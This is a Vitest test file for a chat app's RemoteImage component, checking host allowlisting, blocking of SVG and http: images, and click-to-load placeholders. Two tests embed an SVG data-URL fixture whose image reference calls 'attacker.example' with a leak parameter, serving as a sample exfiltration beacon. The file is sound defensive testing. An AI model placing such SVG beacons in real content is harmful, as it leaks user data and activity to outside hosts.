// @vitest-environment happy-dom
import { BASE_URL } from '@exodus/shared/constants/systems'
import { TEST_IDS } from '@exodus/shared/constants/test-ids'
import type { WebSearchResult } from '@exodus/shared/types/web-search'
import { act, createElement } from 'react'
import { createRoot } from 'react-dom/client'
import { describe, expect, it, vi } from 'vitest'

const t = (key: string) => key
vi.mock('react-i18next', () => ({ useTranslation: () => ({ t }) }))

const {
  AllowedImageHostsContext,
  RemoteImage,
  allowedImageHosts,
  loadsAutomatically
} = await import('@/components/remote-image')

;(
  globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }
).IS_REACT_ACT_ENVIRONMENT = true

const SOURCES: WebSearchResult[] = [
  {
    rank: 1,
    link: 'https://example.com/a',
    title: 'A',
    content: 'a',
    snippet: 'a'
  },
  {
    rank: 2,
    link: 'https://other.example/b',
    title: 'B',
    content: 'b',
    snippet: 'b',
    hostname: 'other.example'
  }
] as WebSearchResult[]

function render(
  src: string | undefined,
  alt: string,
  allowedHosts: ReadonlySet<string> | null = null
) {
  const host = document.createElement('div')
  const root = createRoot(host)
  const tree = createElement(
    AllowedImageHostsContext.Provider,
    { value: allowedHosts },
    createElement(RemoteImage, { src, alt })
  )
  return { host, root, tree }
}

describe('allowedImageHosts', () => {
  it('collects hosts from webSearchResults, preferring the given hostname', () => {
    const hosts = allowedImageHosts(SOURCES)
    expect(hosts).not.toBeNull()
    expect([...hosts!]).toEqual(
      expect.arrayContaining(['example.com', 'other.example'])
    )
  })

  it('returns null with no results', () => {
    expect(allowedImageHosts(undefined)).toBeNull()
    expect(allowedImageHosts([])).toBeNull()
  })
})

const svgWithRemoteRef = (payload: string) =>
  `data:image/svg+xml;base64,${Buffer.from(payload).toString('base64')}`

describe('loadsAutomatically', () => {
  it('loads a raster data: URL and the app media route always', () => {
    expect(loadsAutomatically('data:image/png;base64,abc', null)).toBe(true)
    expect(
      loadsAutomatically(`${BASE_URL}/api/v1/media/chat-1/img.png`, null)
    ).toBe(true)
  })

  it('loads every raster MIME type', () => {
    for (const mime of [
      'image/png',
      'image/jpeg',
      'image/jpg',
      'image/gif',
      'image/webp',
      'image/avif'
    ]) {
      expect(loadsAutomatically(`data:${mime};base64,abc`, null)).toBe(true)
    }
  })

  it('matches the data: MIME case-insensitively', () => {
    expect(loadsAutomatically('DATA:IMAGE/PNG;BASE64,abc', null)).toBe(true)
    expect(loadsAutomatically('Data:Image/Png,abc', null)).toBe(true)
  })

  it('never auto-loads an SVG data: URL — it can resolve its own remote references', () => {
    const svg = svgWithRemoteRef(
      '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://attacker.example/?leak=1"/></svg>'
    )
    expect(loadsAutomatically(svg, null)).toBe(false)
  })

  it('never auto-loads a data: URL with another, missing, or malformed MIME', () => {
    expect(loadsAutomatically('data:text/html,<b>hi</b>', null)).toBe(false)
    expect(loadsAutomatically('data:,hello', null)).toBe(false)
    expect(loadsAutomatically('data:image/png', null)).toBe(false)
    expect(loadsAutomatically('data:image/png;base64', null)).toBe(false)
  })

  it('loads an https image from an allowed host only', () => {
    const hosts = new Set(['example.com'])
    expect(loadsAutomatically('https://example.com/a.png', hosts)).toBe(true)
    expect(loadsAutomatically('https://evil.example/a.png', hosts)).toBe(false)
  })

  it('never auto-loads http:, even from an allowed host', () => {
    const hosts = new Set(['example.com'])
    expect(loadsAutomatically('http://example.com/a.png', hosts)).toBe(false)
  })

  it('refuses an unparsable src', () => {
    expect(loadsAutomatically('not a url', new Set(['example.com']))).toBe(
      false
    )
  })
})

describe('<RemoteImage>', () => {
  it('renders <img> for a data: URL', async () => {
    const { host, root, tree } = render('data:image/png;base64,abc', 'a pic')
    await act(async () => root.render(tree))
    expect(host.querySelector('img')?.getAttribute('src')).toBe(
      'data:image/png;base64,abc'
    )
    expect(host.querySelector(`[data-testid]`)).toBeNull()
  })

  it('renders a placeholder (no <img>) for an SVG data: URL, labelled "inline image"', async () => {
    const svg = svgWithRemoteRef(
      '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://attacker.example/?leak=1"/></svg>'
    )
    const { host, root, tree } = render(svg, 'a pic')
    await act(async () => root.render(tree))
    expect(host.querySelector('img')).toBeNull()
    const placeholder = host.querySelector(
      `[data-testid="${TEST_IDS.chat.remoteImage.placeholder}"]`
    )
    expect(placeholder).not.toBeNull()
    expect(placeholder?.textContent).toContain('remoteImage.inlineImage')
    expect(placeholder?.textContent).not.toContain('attacker.example')
  })

  it('renders <img> for the app media route', async () => {
    const src = `${BASE_URL}/api/v1/media/chat-1/img.png`
    const { host, root, tree } = render(src, 'a pic')
    await act(async () => root.render(tree))
    expect(host.querySelector('img')?.getAttribute('src')).toBe(src)
  })

  it('renders <img> for an https image from a search-result host', async () => {
    const { host, root, tree } = render(
      'https://example.com/photo.png',
      'a pic',
      allowedImageHosts(SOURCES)
    )
    await act(async () => root.render(tree))
    expect(host.querySelector('img')?.getAttribute('src')).toBe(
      'https://example.com/photo.png'
    )
  })

  it('renders a placeholder (no <img>) for an unknown host — no request is made', async () => {
    const { host, root, tree } = render(
      'https://tracker.example/pixel.png',
      'a pic'
    )
    await act(async () => root.render(tree))
    expect(host.querySelector('img')).toBeNull()
    const placeholder = host.querySelector(
      `[data-testid="${TEST_IDS.chat.remoteImage.placeholder}"]`
    )
    expect(placeholder).not.toBeNull()
    expect(placeholder?.textContent).toContain('tracker.example')
    expect(placeholder?.textContent).toContain('a pic')
    expect(
      host.querySelector(
        `[data-testid="${TEST_IDS.chat.remoteImage.loadButton}"]`
      )
    ).not.toBeNull()
  })

  it('shows a placeholder for http:, even from an allowed host', async () => {
    const { host, root, tree } = render(
      'http://example.com/photo.png',
      'a pic',
      new Set(['example.com'])
    )
    await act(async () => root.render(tree))
    expect(host.querySelector('img')).toBeNull()
    expect(
      host.querySelector(
        `[data-testid="${TEST_IDS.chat.remoteImage.placeholder}"]`
      )
    ).not.toBeNull()
  })

  it('loads on click, and stays loaded across a re-render', async () => {
    const src = 'https://tracker.example/click-once.png'
    const { host, root, tree } = render(src, 'a pic')
    await act(async () => root.render(tree))
    expect(host.querySelector('img')).toBeNull()

    const button = host.querySelector<HTMLButtonElement>(
      `[data-testid="${TEST_IDS.chat.remoteImage.loadButton}"]`
    )
    expect(button).not.toBeNull()
    await act(async () => button!.click())

    expect(host.querySelector('img')?.getAttribute('src')).toBe(src)
    expect(host.querySelector(`[data-testid]`)).toBeNull()

    // A fresh instance (unmounted and remounted) for the same src stays
    // loaded — "loaded" is remembered per src for the session, not per
    // component instance.
    await act(async () => root.unmount())
    const { host: host2, root: root2, tree: tree2 } = render(src, 'a pic')
    await act(async () => root2.render(tree2))
    expect(host2.querySelector('img')?.getAttribute('src')).toBe(src)
  })

  it('a different src on the same instance keeps its own auto-load decision', async () => {
    const host = document.createElement('div')
    const root = createRoot(host)
    const unknown = 'https://tracker.example/never-loaded.png'
    const known = 'https://example.com/known.png'
    const allowed = new Set(['example.com'])

    await act(async () =>
      root.render(
        createElement(
          AllowedImageHostsContext.Provider,
          { value: allowed },
          createElement(RemoteImage, { src: unknown, alt: 'x' })
        )
      )
    )
    expect(host.querySelector('img')).toBeNull()

    await act(async () =>
      root.render(
        createElement(
          AllowedImageHostsContext.Provider,
          { value: allowed },
          createElement(RemoteImage, { src: known, alt: 'x' })
        )
      )
    )
    expect(host.querySelector('img')?.getAttribute('src')).toBe(known)
  })
})
